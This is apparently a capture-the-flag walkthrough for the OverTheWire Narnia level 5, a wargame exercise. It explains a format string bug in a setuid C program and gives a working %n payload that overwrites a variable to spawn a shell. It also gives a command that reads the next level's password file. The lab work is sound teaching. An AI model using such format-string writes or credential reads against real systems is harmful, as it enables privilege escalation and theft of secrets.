# Narnia OverTheWire Level 5-6


## Problem Explanation & Background Knowledge



-This Narnia level brings a "format string vulnerability" challenge.

-The binary is an exploitable setuid program that can be exploited to obtain a shell as Narnia6 user

### Source Code


    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    int main(int argc, char **argv){
	    int i = 1;
	    char buffer[64];

	    snprintf(buffer, sizeof buffer, argv[1]);
	    buffer[sizeof (buffer) - 1] = 0;
	    printf("Change i's value from 1 -> 500. ");

	    if(i==500){
		    printf("GOOD\n");
            setreuid(geteuid(),geteuid());
		    system("/bin/sh");
	    }

	    printf("No way...let me give you a hint!\n");
	    printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	    printf ("i = %d (%p)\n", i, &i);
	    return 0;
    }


### Vulnerability Analysis

-The bug is on this line:

     snprintf(buffer, sizeof buffer, argv[1]);

-snprintf expects the third argument to be a format string like %s or %d followed by the actual data...here the user input is passed directly as the format string

-This is a problem because format strings support special directives such as:

%x-read and print value from the stack as hex

%s-read and print a string from the stack

%n-write the number of characters printed in a memory address

%"number"x-print a value padded to a specific number of characters

$1$n-Positional argument:write to the address at position 1 on the stack


### Some Stack and Memory Concepts


-On x86 Linux the stack grows downward and local variables are stored sequentially in memory.

-In this case the program tells us the address of i every time it runs with some characters

   i = 1 (0xffffdab0)

-This is the exact memory address we need to overwrite


## Solution Process 

-Since the program tells us exactly where i lives in memory everytime we run an argument we need to find the position of out buffer on the stack


-We place the address of i at he start of the payload and use positional specifiers

Output:
    
    Change i's value from 1 -> 500. No way...let me give you a hint!
    buffer : [����            ffffdab0] (24)
    i = 24 (0xffffdab0)


-i changed from 1 to 24, so now we changing the i value,we have to make the total printed character count = 500.

-We have 4 bytes in the address ,we need 496 more...


    ./narnia5 $(perl -e 'print "\xb0\xda\xff\xff"')%496x%1\$n


-Now we got the shell as narnia6 and look for the password file 

    cat /etc/narnia_pass/narnia6




## Key concepts learned

### Format String Vulnerability

-When user input is passed directly as a format string to printf,anyone can control format specifiers and can read from or write to memory locations

### %n 

-%n is the only format specifier that writes to memory ,it stores the count of characters printed so far into the address provided as its argument.


